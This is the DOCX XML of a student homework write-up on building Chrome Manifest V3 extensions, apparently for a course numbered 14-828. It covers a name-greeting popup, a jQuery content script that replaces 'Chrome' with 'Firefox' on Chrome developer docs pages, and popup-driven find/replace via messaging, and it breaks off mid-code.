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5ADDB">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Andrew ID:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[YOUR ANDREW ID]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="417A4DE3">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Note for export to PDF:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Insert a manual page break before each major heading (Q1.1, Q1.2, …) if your converter does not support the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>{=latex}</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> blocks below. With Pandoc to PDF, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>\newpage</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> lines are preserved when you use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-f markdown</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7265CA93">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="09B01A74">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>Question 1.1 — Hello World browser action (explanation)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA7EF95">
      <w:r>
        <w:t xml:space="preserve">I implemented a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Manifest V3</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> extension whose </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>browser action</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> opens </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>popup.html</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. The popup contains a single-line text field for the user’s name. A listener on the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>input</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> event reads the trimmed value and sets a paragraph’s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>textContent</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Hello {name}!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> when non-empty, and clears it otherwise. Using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>textContent</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> avoids HTML injection from the typed name.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44F45AFF">
      <w:r>
        <w:t xml:space="preserve">Styling is in a separate </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>popup.css</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file; behavior is in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>popup.js</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">; structure and external links are in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>popup.html</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (no inline </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>&lt;script&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>&lt;style&gt;</w:t>
      </w:r>
      <w:r>
        <w:t>, per the assignment).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5558933A">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Verification:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Load the unpacked </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Q1.1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> folder at </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>chrome://extensions</w:t>
      </w:r>
      <w:r>
        <w:t>, click the extension icon, type a name, and observe the live greeting. ![][image1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="640E3C59">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
      <w:r>
        <w:t>Q1.1 — Code appendix</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61A92106">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`manifest.json`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D68B18A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"manifest_version":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"HW2 Q1.1 Hello World",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"1.0",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"14-828 HW2 — browser action popup with name greeting",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"action":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"default_title": "Hello",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"default_popup": "popup.html"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9256647">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`popup.html`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2825DCBF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 lang="en"&gt;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&lt;meta charset="utf-8"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&lt;meta name="viewport" content="width=device-width, initial-scale=1"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&lt;title&gt;Hello&lt;/title&gt;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&lt;link rel="stylesheet" href="popup.css"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&lt;main class="card"&gt;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&lt;h1 class="title"&gt;Greeting&lt;/h1&gt;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&lt;label class="label" for="name"&gt;Your name&lt;/label&gt;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&lt;input class="input" type="text" id="name" name="name" autocomplete="name" placeholder="Type your name"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&lt;p class="greeting" id="greeting" aria-live="polite"&gt;&lt;/p&gt;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&lt;/main&gt;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 src="popup.js"&gt;&lt;/script&gt;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50A571BF">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`popup.js`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="610D9E47">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>const nameInput = document.getElementById("name");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greetingEl = document.getElementById("greeting");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nameInput.addEventListener("input",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name = nameInput.value.trim();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greetingEl.textContent = name ? `Hello ${name}!` : "";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719FD246">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`popup.css`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23F7D305">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>*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box-sizing: border-box;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body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min-width: 260px;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font-family: system-ui, "Segoe UI", sans-serif;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background: #f4f4f5;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#18181b;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.card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padding: 14px 16px 18px;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.title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0 0 12px;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1rem;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font-weight: 600;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.label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display: block;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margin-bottom: 6px;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0.8rem;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#52525b;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.input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width: 100%;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padding: 8px 10px;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border: 1px solid #d4d4d8;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border-radius: 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0.95rem;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outline: none;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.input:focus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border-color: #2563eb;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box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.2);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.greeting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12px 0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min-height: 1.4em;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0.95rem;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font-weight: 500;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#0f172a;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1150544">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B2B7BA">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>Question 1.2 — Content scripts and jQuery (explanation)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A390290">
      <w:r>
        <w:t xml:space="preserve">I extended the Q1.1 extension with a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>content script</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> registered only for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>https://developer.chrome.com/docs/extensions/*</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. The manifest loads </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`jquery.min.js` before `content.js`</w:t>
      </w:r>
      <w:r>
        <w:t>, satisfying the requirement to use an external library like jQuery.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47A50756">
      <w:r>
        <w:t xml:space="preserve">The content script (1) walks text nodes under </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>body</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> using jQuery’s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.contents()</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> filter for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>TEXT_NODE</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and replaces every substring </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Chrome</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Firefox</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in those nodes only (so we do not rewrite </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>script</w:t>
      </w:r>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>style</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> internals). (2) It replaces the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>top header logo</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> image </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>chrome.runtime.getURL("firefox-logo.svg")</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, declared under </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`web_accessible_resources`</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>https://developer.chrome.com/*</w:t>
      </w:r>
      <w:r>
        <w:t>, so the page may load the packaged SVG.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="164116D6">
      <w:r>
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`MutationObserver`</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> re-applies the text and logo changes when the SPA-style docs site mutates the DOM.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="164192B1">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Third-party file:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>jquery.min.js</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>jQuery v3.7.1 minified</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> from the official jQuery CDN release; it is included in the code zip as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Q1.2/jquery.min.js</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> but is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>not pasted here</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in full because of length.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="789A40E8">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Verification:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Load </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Q1.2</w:t>
      </w:r>
      <w:r>
        <w:t>, open any page under the required path on developer.chrome.com, confirm visible “Chrome” becomes “Firefox” and the header icon switches to the bundled SVG.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60B0CDC9">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>Q1.2 — Code appendix</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B2EB2B8">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`manifest.json`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28FE5E39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"manifest_version":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"HW2 Q1.2 Content Script (Chrome→Firefox)",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"1.0",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"14-828 HW2 — Q1.1 + jQuery content script on developer.chrome.com/docs/extensions/",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"action":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"default_title": "Hello",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"default_popup": "popup.html"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"content_scripts":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"matches": ["https://developer.chrome.com/docs/extensions/*"],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"js": ["jquery.min.js", "content.js"],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"run_at": "document_idle"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"web_accessible_resources":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"resources": ["firefox-logo.svg"],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"matches": ["https://developer.chrome.com/*"]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EBE0A87">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`content.js`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="421791E9">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>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Q1.2: jQuery is loaded before this script (see manifest).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Replaces visible text "Chrome" → "Firefox" and swaps the header logo image.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replaceChromeInTextNodes(root)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$(root)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.find("*")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.addBack()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.contents()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.filter(function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return this.nodeType === Node.TEXT_NODE &amp;&amp; this.textContent.includes("Chrome");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.each(function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this.textContent = this.textContent.replace(/Chrome/g, "Firefox");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swapHeaderLogoToFirefox()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logoUrl = chrome.runtime.getURL("firefox-logo.svg");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$candidates = $(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"a[href='https://developer.chrome.com/']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"devsite-header a[href='/']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"header.devsite-header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".devsite-header-icon-link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"header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].join(",")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$candidates.each(function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$img = $(this);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($img.closest("nav, footer").length)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$img.attr("src", logoUrl);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runTransforms()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replaceChromeInTextNodes($("body")[0]);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swapHeaderLogoToFirefox();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$(function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runTransforms();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target = document.body;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(!target)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obs = new MutationObserver(()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replaceChromeInTextNodes(document.body);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swapHeaderLogoToFirefox();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obs.observe(target, { childList: true, subtree: true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64B1FD63">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`firefox-logo.svg`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31807801">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 80 80" role="img" aria-label="Firefox"&gt;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&lt;defs&gt;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&lt;linearGradient id="fx" x1="0%" y1="0%" x2="100%" y2="100%"&gt;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&lt;stop offset="0%" style="stop-color:#ffbd4f"/&gt;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&lt;stop offset="100%" style="stop-color:#ff7139"/&gt;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&lt;/linearGradient&gt;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&lt;/defs&gt;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&lt;rect width="80" height="80" rx="14" fill="url(#fx)"/&gt;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&lt;circle cx="40" cy="42" r="18" fill="#fff" opacity="0.95"/&gt;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&lt;/svg&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C3EB62C">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Popup files (`popup.html`, `popup.js`, `popup.css`):</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> identical to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Question 1.1</w:t>
      </w:r>
      <w:r>
        <w:t>; see the Q1.1 code appendix above.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71256B06">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A8D57A1">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>Question 1.3 — Messaging and custom replace (explanation)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35D4F5E9">
      <w:r>
        <w:t xml:space="preserve">I kept the Q1.2 content script and added </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`chrome.runtime.onMessage`</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> handling for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>{ type: "REPLACE_TEXT", match, replaceWith }</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. The handler escapes regex metacharacters in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>match</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, then replaces all occurrences in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>text nodes</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> only (same jQuery </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.contents()</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> pattern as Q1.2).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="618271DD">
      <w:r>
        <w:t>The popup adds two fields (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>match</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>replace with</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) and a button. On click, the popup uses </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`chrome.tabs.query`</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for the active tab and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`chrome.tabs.sendMessage`</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to deliver the message. The manifest includes </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`"permissions": ["activeTab"]`</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> so the extension can target the current tab when the user opens the popup. The content script is only injected on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>developer.chrome.com/docs/extensions/*</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, so </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>sendMessage</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> fails on other origins; the popup surfaces an error string in that case.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5855DE12">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Verification:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> On a matching docs page, enter a visible substring (e.g. a word in a heading) and a replacement; click </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Apply on page</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and confirm the DOM text updates.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F30FC0C">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>Q1.3 — Code appendix</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66AE6BFF">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`manifest.json`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="285ECE1F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"manifest_version":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"HW2 Q1.3 Match/Replace Messaging",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"1.0",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"14-828 HW2 — Q1.1/Q1.2 + popup-driven find/replace via messaging",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"action":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"default_title": "Hello / Replace",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"default_popup": "popup.html"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"permissions": ["activeTab"],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"content_scripts":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"matches": ["https://developer.chrome.com/docs/extensions/*"],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"js": ["jquery.min.js", "content.js"],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"run_at": "document_idle"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"web_accessible_resources":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"resources": ["firefox-logo.svg"],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"matches": ["https://developer.chrome.com/*"]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0553441">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`popup.html`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EFD13B6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 lang="en"&gt;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&lt;meta charset="utf-8"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&lt;meta name="viewport" content="width=device-width, initial-scale=1"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&lt;title&gt;Hello / Replace&lt;/title&gt;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&lt;link rel="stylesheet" href="popup.css"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&lt;main class="card"&gt;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&lt;h1 class="title"&gt;Greeting&lt;/h1&gt;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&lt;label class="label" for="name"&gt;Your name&lt;/label&gt;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&lt;input class="input" type="text" id="name" name="name" autocomplete="name" placeholder="Type your name"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&lt;p class="greeting" id="greeting" aria-live="polite"&gt;&lt;/p&gt;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&lt;hr class="sep"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&lt;h2 class="subtitle"&gt;Page replace&lt;/h2&gt;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&lt;p class="hint"&gt;Active tab must be on &lt;code&gt;developer.chrome.com/docs/extensions/&lt;/code&gt;&lt;/p&gt;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&lt;label class="label" for="match"&gt;Match text&lt;/label&gt;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&lt;input class="input" type="text" id="match" placeholder="e.g. API"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&lt;label class="label" for="replaceWith"&gt;Replace with&lt;/label&gt;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&lt;input class="input" type="text" id="replaceWith" placeholder="Replacement"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&lt;button type="button" class="btn" id="applyReplace"&gt;Apply on page&lt;/button&gt;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&lt;p class="status" id="status" aria-live="polite"&gt;&lt;/p&gt;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&lt;/main&gt;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 src="popup.js"&gt;&lt;/script&gt;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2CBB827D">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`popup.js`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B005979">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>const nameInput = document.getElementById("name");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greetingEl = document.getElementById("greeting");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matchInput = document.getElementById("match");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replaceInput = document.getElementById("replaceWith");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applyBtn = document.getElementById("applyReplace");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statusEl = document.getElementById("status");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nameInput.addEventListener("input",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name = nameInput.value.trim();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greetingEl.textContent = name ? `Hello ${name}!` : "";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applyBtn.addEventListener("click", async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statusEl.textContent = "";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match = matchInput.value;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replaceWith = replaceInput.value;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(!match)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statusEl.textContent = "Enter text to match.";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[tab] = await chrome.tabs.query({ active: true, currentWindow: true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(!tab?.id)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statusEl.textContent = "No active tab.";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try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res = await chrome.tabs.sendMessage(tab.id,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type: "REPLACE_TEXT",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match,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replaceWith,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statusEl.textContent = res?.ok ? "Replace request sent." : "Could not replace.";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catch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statusEl.textContent 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"Message failed — open a page under developer.chrome.com/docs/extensions/ and reload.";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71F287A2">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`popup.css`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43D1267A">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>*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box-sizing: border-box;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body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min-width: 280px;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font-family: system-ui, "Segoe UI", sans-serif;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background: #f4f4f5;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#18181b;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.card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padding: 14px 16px 18px;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.title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0 0 12px;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1rem;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font-weight: 600;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.subtitle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0 0 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0.9rem;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font-weight: 600;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.hint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0 0 10px;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0.72rem;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#64748b;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line-height: 1.35;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.hint code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0.68rem;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word-break: break-all;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.sep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14px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border: none;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border-top: 1px solid #e4e4e7;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.label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display: block;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8px 0 6px;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0.8rem;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#52525b;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.label:first-of-type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margin-top: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.input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width: 100%;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padding: 8px 10px;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border: 1px solid #d4d4d8;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border-radius: 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0.95rem;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outline: none;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.input:focus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border-color: #2563eb;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box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.2);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.btn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margin-top: 12px;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width: 100%;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padding: 9px 12px;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border: none;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border-radius: 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background: #2563eb;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#fff;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0.9rem;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font-weight: 600;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cursor: pointer;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.btn:hover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background: #1d4ed8;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.greeting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12px 0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min-height: 1.4em;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0.95rem;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font-weight: 500;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#0f172a;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.status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margin: 10px 0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font-size: 0.78rem;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color: #475569;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min-height: 1.2em;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ED34F10">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`content.js`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F801FDB">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>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Q1.2 behavior + Q1.3: handle REPLACE_TEXT messages from the popup.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replaceChromeInTextNodes(root)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$(root)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.find("*")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.addBack()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.contents()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.filter(function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return this.nodeType === Node.TEXT_NODE &amp;&amp; this.textContent.includes("Chrome");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.each(function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this.textContent = this.textContent.replace(/Chrome/g, "Firefox");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swapHeaderLogoToFirefox()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logoUrl = chrome.runtime.getURL("firefox-logo.svg");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$candidates = $(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"a[href='https://developer.chrome.com/']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"devsite-header a[href='/']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"header.devsite-header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".devsite-header-icon-link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"header img",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].join(",")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$candidates.each(function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$img = $(this);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($img.closest("nav, footer").length)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$img.attr("src", logoUrl);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applyCustomReplace(match, replaceWith)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(!match)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esc = match.replace(/[.*+?^${}()|[\]\\]/g, "\\$&amp;");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re = new RegExp(esc, "g");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$("body")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.find("*")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.addBack()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.contents()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.filter(function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return this.nodeType === Node.TEXT_NODE &amp;&amp; this.textContent.includes(match);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.each(function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this.textContent = this.textContent.replace(re, replaceWith);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runTransforms()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replaceChromeInTextNodes($("body")[0]);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swapHeaderLogoToFirefox();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chrome.runtime.onMessage.addListener((msg, _sender, sendResponse)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(msg?.type === 